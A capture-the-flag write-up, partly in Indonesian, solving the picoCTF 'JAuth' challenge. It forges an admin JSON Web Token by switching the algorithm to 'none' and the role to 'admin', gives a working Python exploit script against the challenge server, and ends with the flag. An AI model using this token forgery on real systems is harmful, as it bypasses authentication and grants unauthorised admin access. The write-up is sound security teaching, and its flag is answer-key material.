<h1>JAuth</h1>
<p>Most web application developers use third party components without testing their security. Some of the past affected companies are:.</p>
<ul>
  <li>Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638</li>
  <li>Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used</li>
  <li>VerticalScope (internet media company) - outdated version of vBulletin forum software used</li>
</ul>
<p>Can you identify the components and exploit the vulnerable one?
The website is running here. Can you become an admin?
You can login as test with the password Test123! to get started.</p>

<p>Hint :</p>
<ul>
  <li>Use the web browser tools to check out the JWT cookie.</li>
  <li>The JWT should always have two (2) . separators.</li>
</ul>
<h3>Solution</h3>
<p>Login username=test Password=Test123 pada web, dan ambil JWT pada cookie, lanjut JWT Attack</p>

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjYyNjE5MDM2MjQ3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDUuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjYyNjE5MDM2fQ.8SAus5Cq2cRtS7or8oVro_oZorI9PAqhu3XFzVkBm5g
```
<p>JWT terdiri dari Header, Payload, Signature. yang jika didecode pada <a href='https://token.dev/'>link</a> Didapatkan</p>

```
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "auth": 1662611103288,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
  "role": "user",
  "iat": 1662611103
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  
your-256-bit-secret

) secret base64 encoded
```
<p>Ganti header alg=HS256 ke alg=none, dan role=user menjadi role=admin dan hasilnya tanpa signature (header,payload,signature dipisah dengan titik)</p>

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjYyNjE5MDM2MjQ3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDUuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY2MjYxOTAzNn0.
```

```python3
import requests
import base64

url = 'http://saturn.picoctf.net:55823/auth'
new_url = 'http://saturn.picoctf.net:55823/private'
ses = requests.Session()
data = {'username':'test',
        'password':'Test123!'}

response = ses.post(url,data=data)
cookieJar = ses.cookies.get_dict()
for i in cookieJar.values():
    split_token = i.split('.')
    header = base64.b64decode(split_token[0]).decode('ascii').replace('HS256','none')
    payload = base64.b64decode(split_token[1]+'=').decode('ascii').replace('user','admin')
    data_1 = base64.b64encode(header.encode('utf8')).decode('ascii')[:-1]+'.'
    data_2 = base64.b64encode(payload.encode('utf8')).decode('ascii')+'.'
    new_cookies = {'token':data_1+data_2}
    print(new_cookies)
    get_flag = requests.post(new_url,cookies=new_cookies).text
    print(get_flag)
```
<p>Ganti token dan refresh halaman</p>
<h3>Flag</h3>
<p>picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}</p>
